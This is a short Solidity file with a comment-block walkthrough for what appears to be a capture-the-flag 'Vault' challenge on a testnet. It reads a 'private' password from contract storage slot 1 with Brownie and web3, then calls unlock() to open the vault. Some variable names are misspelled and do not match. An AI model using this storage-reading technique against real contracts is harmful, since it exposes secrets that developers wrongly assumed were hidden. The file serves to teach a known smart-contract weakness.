/* 

Note: state variables are available to external users on the blockchain regardless of being private 


# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# get storage at address 1 for the password state variable 

passsword = web3.eth.getStorageAt(contraacrtaddresss,1)

# call unlock with the above result

v_contract = interface.Vault("VaultContractAddress")
v_contract.unlock(password,{'from': a[0]})

# confirm vault is unlocked

web3.eth.getStorageAt("0x5AddF5980E2A3075d1b8D6619B9415e35ea7609e",0) 

# submit

*/


//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

interface Vault {

function unlock(bytes32 _password) external; 

}